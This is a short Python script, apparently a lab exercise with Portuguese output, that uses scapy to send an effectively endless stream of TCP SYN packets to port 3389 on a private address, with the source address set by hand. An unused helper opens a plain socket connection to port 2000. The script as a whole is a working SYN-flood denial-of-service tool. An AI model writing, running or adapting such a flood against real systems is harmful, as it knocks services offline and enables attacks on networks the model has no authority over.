from scapy.all import *
import socket
import sys


def start_client():
    host = "172.16.43.20"
    port = int(2000)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.close()


for i in range(0, 2000000000000000):
    p = IP(dst="172.16.43.20", src="172.16.43.22") / TCP(dport=3389, flags="S")
    print("enviando pacote")
    send(p, verbose=0)
